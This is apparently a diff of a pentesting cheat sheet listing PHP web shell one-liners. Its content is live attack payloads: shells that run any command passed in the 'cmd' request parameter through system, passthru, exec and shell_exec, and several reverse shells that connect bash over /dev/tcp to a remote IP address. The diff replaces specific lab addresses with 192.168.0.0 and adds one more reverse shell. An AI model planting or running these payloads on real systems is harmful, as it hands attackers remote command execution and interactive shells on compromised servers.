@@ -2,10 +2,12 @@
 <?php system($_REQUEST['cmd']); ?>  #Run comaands using cmd
 <?php system('uname -a'); ?>
 <?php system('id'); ?>
-<?php system("bash -i >& /dev/tcp/192.168.45.214/8888 0>&1");?>
-<?php system("/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.120.3/80 0<&1 2>&1'"); ?>
+<?php system("bash -i >& /dev/tcp/192.168.0.0/8888 0>&1");?>
+<?php system("/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.0.0/80 0<&1 2>&1'"); ?>
 
 <?php echo passthru($_GET['cmd']); ?>
 <?php echo exec($_POST['cmd']); ?>
 <?php system($_GET['cmd']); ?>
 <?php passthru($_REQUEST['cmd']); ?>
+
+<?php shell_exec("/bin/bash -c \'/bin/bash -i >& /dev/tcp/192.168.0.0/8888 0>&1\'");?>
